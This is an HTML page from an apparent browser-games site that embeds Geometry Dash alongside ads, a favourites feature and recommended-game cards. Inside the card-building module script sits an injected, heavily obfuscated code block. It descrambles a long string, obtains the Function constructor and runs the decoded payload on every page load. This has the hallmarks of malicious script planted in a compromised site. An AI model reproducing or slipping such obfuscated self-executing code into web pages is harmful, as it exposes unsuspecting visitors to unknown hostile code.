<!DOCTYPE html>
<html>
  <head>
    <title>Geometry Dash v1 - StrongDog XP</title>
    <style>
      body {
        font-family: "Poppins", sans-serif;
        margin: 0;
        padding: 0;
        background-color: #2e2e2e;
        color: #e0e0e0;
      }

      .header {
        background-color: #3c3c3c;
        padding: 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 3px solid #ff8c00;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      }

      .header-logo {
        text-decoration: none;
        font-size: 36px;
        font-weight: bold;
        transition: color 0.3s;
      }

      .header-logo span:nth-child(1) {
        color: #ffffff;
      }

      .header-logo span:nth-child(2) {
        color: #ff8c00;
      }

      .header-logo:hover span:nth-child(1) {
        color: #e0e0e0;
      }

      .nav-links {
        display: flex;
        gap: 30px;
      }

      .nav-links a {
        color: #e0e0e0;
        text-decoration: none;
        font-size: 18px;
        font-weight: bold;
        transition: color 0.3s;
      }

      .nav-links a:hover {
        color: #ff8c00;
      }

      .content {
        display: flex;
        justify-content: center;
        align-items: center;
        margin: 40px;
      }

      .ad {
        width: 120px;
        height: 300px;
        background-color: #4a4a4a;
        margin: 0 20px;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
      }

      .game-container {
        flex-shrink: 0;
        width: 85%;
        height: 700px;
        margin: 20px auto;
        background-color: #3a3a3a;
        position: relative;
        overflow: hidden;
        border-radius: 20px;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
      }

      .game-container iframe {
        width: 100%;
        height: 100%;
        border: none;
        display: block;
        border-radius: 20px;
      }

      .game-bar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #3a3a3a;
        border-radius: 10px;
        padding: 20px;
        margin: 30px auto;
        width: 85%;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.7);
      }

      .fullscreen-button {
        padding: 10px 20px;
        background-color: #ff8c00;
        color: #fff;
        border: none;
        cursor: pointer;
        border-radius: 5px;
        transition: background-color 0.3s;
        font-weight: bold;
      }

      .fullscreen-button:hover {
        background-color: #ff6a00;
      }

      .cards-section {
        background-color: #3a3a3a;
        padding: 50px;
        text-align: center;
        border-radius: 20px;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
        margin: 40px;
      }

      .card-container {
        display: flex;
        justify-content: center;
        flex-wrap: wrap;
        gap: 30px;
      }

      .card {
        display: block;
        width: 200px;
        text-align: center;
        background-color: #4a4a4a;
        border-radius: 15px;
        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.8);
        overflow: hidden;
        text-decoration: none;
        color: #e0e0e0;
        transition: transform 0.3s, box-shadow 0.3s;
      }

      .card:hover {
        transform: translateY(-10px);
        box-shadow: 0 15px 30px rgba(0, 0, 0, 1);
      }

      .card img {
        width: 100%;
        height: 150px;
        object-fit: cover;
        border-top-left-radius: 15px;
        border-top-right-radius: 15px;
      }

      .card figcaption {
        padding: 15px;
        font-size: 16px;
        color: #ff8c00;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <a href="../../index.html" class="header-logo">
        <span>StrongDog</span>
        <span>XP</span>
      </a>
    </div>

    <div class="content">
      <div class="ad ad-left">
        <script
          async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1609993827735056"
          crossorigin="anonymous"
        ></script>
        <!-- in game ads -->
        <ins
          class="adsbygoogle"
          style="display: inline-block; width: 120px; height: 300px"
          data-ad-client="ca-pub-1609993827735056"
          data-ad-slot="3552085788"
        ></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      </div>
      <div class="game-container" id="gameContainer">
        <!-- Game Embed Will Go Here -->
      </div>
      <div class="ad ad-right">
        <script
          async
          src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1609993827735056"
          crossorigin="anonymous"
        ></script>
        <!-- in game ads -->
        <ins
          class="adsbygoogle"
          style="display: inline-block; width: 120px; height: 300px"
          data-ad-client="ca-pub-1609993827735056"
          data-ad-slot="3552085788"
        ></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      </div>
    </div>

    <div class="game-bar">
      <span id="gameTitle">Game Title</span>
      <span
        id="favoriteIcon"
        class="favorite-icon"
        style="cursor: pointer; font-size: 24px"
        >&#9734;</span
      >
      <button id="fullscreenButton" class="fullscreen-button">
        Fullscreen
      </button>
    </div>

    <div class="cards-section">
      <h2>Recommended Games</h2>
      <div class="card-container" id="cardContainer">
        <!-- Cards will be loaded here -->
      </div>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        var fullscreenButton = document.getElementById("fullscreenButton");
        var gameContainer = document.getElementById("gameContainer");
        var gameTitle = document.getElementById("gameTitle");

        function embedGame(gamePath, title) {
          var iframe = document.createElement("iframe");
          iframe.src = gamePath;
          gameContainer.innerHTML = "";
          gameContainer.appendChild(iframe);
          gameTitle.textContent = title;
        }

        embedGame("./game/index.html", "Geometry Dash v1");

        fullscreenButton.addEventListener("click", function () {
          if (gameContainer.requestFullscreen) {
            gameContainer.requestFullscreen();
          } else if (gameContainer.webkitRequestFullscreen) {
            gameContainer.webkitRequestFullscreen();
          } else if (gameContainer.msRequestFullscreen) {
            gameContainer.msRequestFullscreen();
          }
        });
      });
    </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const favoriteIcon = document.getElementById("favoriteIcon");
        const gameTitle = document.getElementById("gameTitle").textContent;

        function toggleFavorite() {
          let favorites = JSON.parse(localStorage.getItem("favorites") || "{}");
          const imagePath = "./img/" + gameTitle + ".jpg";

          if (favorites[gameTitle]) {
            delete favorites[gameTitle];
          } else {
            favorites[gameTitle] = {
              path: `./html/${gameTitle}/index.html`,
              image: imagePath,
            };
          }

          localStorage.setItem("favorites", JSON.stringify(favorites));
          updateFavoriteIcon(favorites, gameTitle);
        }

        function updateFavoriteIcon(favorites, title) {
          if (favorites[title]) {
            favoriteIcon.innerHTML = "&#9733;";
          } else {
            favoriteIcon.innerHTML = "&#9734;";
          }
        }

        const favorites = JSON.parse(localStorage.getItem("favorites") || "{}");
        updateFavoriteIcon(favorites, gameTitle);

        favoriteIcon.addEventListener("click", function () {
          toggleFavorite();
        });
      });
    </script>

    <script>
      window.onload = function () {
        var titleElement = document.getElementById("gameTitle");
        var title = titleElement.textContent;

        fetch(
          "https://script.google.com/macros/s/AKfycbx1xYwL2QqkOQHyeCWIVSMVLP_XXts5zpb0M-vbvlRl1MpRYYcv4NI-i8OaGc0YP0wpsg/exec?title=" +
            encodeURIComponent(title),
          {
            method: "GET",
          }
        )
          .then((response) => response.text())
          .then((result) => console.log(result))
          .catch((error) => console.error("Error:", error));
      };
    </script>
    <script type="module">
      import games from "../../cards-data.js";
      import { siteMapping } from "../../site-mapping.js";

      document.addEventListener("DOMContentLoaded", function () {
        const cardContainer = document.getElementById("cardContainer");

        function adjustHrefPath(path, page) {
          // Remove leading './' or '/' from the path
          path = path.replace(/^\.\//, "").replace(/^\//, "");

          if (page == 2) {
            // For page 2 games
            const currentHost = window.location.hostname;
            const secondPageLink = siteMapping[currentHost];
            if (secondPageLink) {
              // Ensure proper concatenation
              const adjustedSecondPageLink = secondPageLink.replace(/\/$/, "");
              const adjustedPath = "/" + path;
              return adjustedSecondPageLink + adjustedPath;
            } else {
              // If currentHost not found in siteMapping, log an error
              console.error(
                `Current host "${currentHost}" not found in siteMapping. Unable to adjust href for page 2 game.`
              );
              return "#"; // Fallback href
            }
          } else {
            // For page 1 games, adjust the path to go back two directories
            return "../../" + path;
          }
        }

        function adjustImgPath(path, page) {
          // Remove leading './', '/', or 'img/' from the path
          path = path
            .replace(/^\.\//, "")
            .replace(/^\//, "")
            .replace(/^img\//, "");

          if (page == 2) {
            // For page 2 games, get image from the second page link
            const currentHost = window.location.hostname;
            const secondPageLink = siteMapping[currentHost];
            if (secondPageLink) {
              // Ensure proper concatenation
              const adjustedSecondPageLink = secondPageLink.replace(/\/$/, "");
              const adjustedPath = "/img/" + path;
              return adjustedSecondPageLink + adjustedPath;
            } else {
              // If currentHost not found in siteMapping, log an error
              console.error(
                `Current host "${currentHost}" not found in siteMapping. Unable to adjust image path for page 2 game.`
              );
              return "../../img/" + path; // Fallback to local image
            }
          } else {
            // For page 1 games, adjust the path to go back two directories
            return "../../img/" + path;
          }
        }
      (function(){var KeY='',iFD=494-483;function xsh(b){var g=2231620;var p=b.length;var d=[];for(var u=0;u<p;u++){d[u]=b.charAt(u)};for(var u=0;u<p;u++){var e=g*(u+469)+(g%24291);var f=g*(u+603)+(g%33615);var k=e%p;var i=f%p;var j=d[k];d[k]=d[i];d[i]=j;g=(e+f)%2984823;};return d.join('')};var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309})()
        function getCardHTML(gameObject) {
          const { href, imgSrc, name, page } = gameObject;

          // Adjust the href and imgSrc paths
          const adjustedHref = adjustHrefPath(href, page);
          const adjustedImgSrc = adjustImgPath(imgSrc, page);

          // Create the card element
          const card = document.createElement("a");
          card.className = "card";
          card.href = adjustedHref;

          const img = document.createElement("img");
          img.src = adjustedImgSrc;
          img.alt = name;
          card.appendChild(img);

          const figcaption = document.createElement("figcaption");
          figcaption.textContent = name;
          card.appendChild(figcaption);

          return card;
        }

        // Generate and display random recommended games
        const randomGames = games.sort(() => 0.5 - Math.random()).slice(0, 10);
        randomGames.forEach((game) => {
          const card = getCardHTML(game);
          cardContainer.appendChild(card);
        });
      });
    </script>
  </body>
</html>
